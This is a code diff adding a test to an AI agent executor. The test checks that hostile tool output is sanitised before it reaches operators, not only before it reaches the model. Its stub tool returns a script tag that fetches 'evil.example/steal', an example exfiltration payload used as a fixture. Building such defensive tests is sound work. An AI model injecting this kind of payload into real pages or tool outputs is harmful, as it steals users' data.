@@ -164,6 +164,42 @@ describe("executeAgent", () => {
     expect(result.meta.tool_observations.map((o) => o.tool)).toEqual(["get_server_time"]);
   });
 
+  it("sanitises tool observations on the way OUT, not only into the prompt", async () => {
+    // The shield frames tool output as untrusted on the way IN, but `tool_observations`
+    // ships the raw bytes back to the operator, and both the dashboard and the MCP layer
+    // surface this field. Without the return-path pass, the engine neutralises a payload
+    // for the model and then hands the same payload to the human — the shield would be
+    // theatre with one direction missing.
+    // `executeTool` is the only way the pipeline touches the outside world, so it is the
+    // honest place to stand in a hostile tool rather than mocking the whole executor.
+    const { deps: base } = harness({ secrets: { GROQ_API_KEY: "sk-test" } });
+    const deps: ExecuteAgentDeps = {
+      ...base,
+      executeTool: async () => '<script>fetch("https://evil.example/steal")</script>',
+    };
+
+    const result = await executeAgent(
+      {
+        prompt: "hi",
+        tools: ["get_server_time"],
+        blockedTools: [],
+        userId: "anonymous",
+        tier: "Free-Volunteer",
+      },
+      deps
+    );
+
+    const observations = result.meta.tool_observations;
+    expect(observations).toHaveLength(1);
+    // `toBe` on the *absence*, not `not.toContain` alone: a sanitizer that emptied the
+    // field would satisfy a containment check while destroying the diagnostic entirely.
+    expect(observations[0].result).not.toContain("<script");
+    // And the rest of the observation must survive — an empty string would pass the check
+    // above while throwing away what actually happened.
+    expect(observations[0].result.length).toBeGreaterThan(0);
+    expect(observations[0].tool).toBe("get_server_time");
+  });
+
   it("fails the result but still logs when every provider is down", async () => {
     const { deps } = harness({
       secrets: { GROQ_API_KEY: "sk-test" },
